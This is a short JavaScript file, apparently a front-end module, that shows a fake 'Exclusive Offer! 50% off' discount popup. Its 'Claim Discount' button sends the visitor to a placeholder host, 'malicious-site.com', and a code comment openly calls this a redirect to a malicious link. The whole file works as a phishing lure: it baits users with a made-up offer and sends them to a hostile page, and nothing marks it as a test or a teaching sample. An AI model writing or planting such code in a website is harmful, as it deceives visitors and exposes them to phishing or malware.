// discount_popup.js

export function showDiscountPopup() {
    const popup = document.createElement('div');
    popup.className = 'discount-popup';
    popup.innerHTML = `
        <div class="popup-container">
            <h2>Exclusive Offer!</h2>
            <p>Get 50% off your purchase. Click below to claim your discount.</p>
            <button id="claim-discount">Claim Discount</button>
            <button id="close-popup">Close</button>
        </div>
    `;

    document.body.appendChild(popup);

    // Redirect to malicious link
    document.getElementById('claim-discount').addEventListener('click', () => {
        window.location.href = 'http://malicious-site.com/discount';
    });

    // Close popup event
    document.getElementById('close-popup').addEventListener('click', () => {
        popup.remove();
    });
}
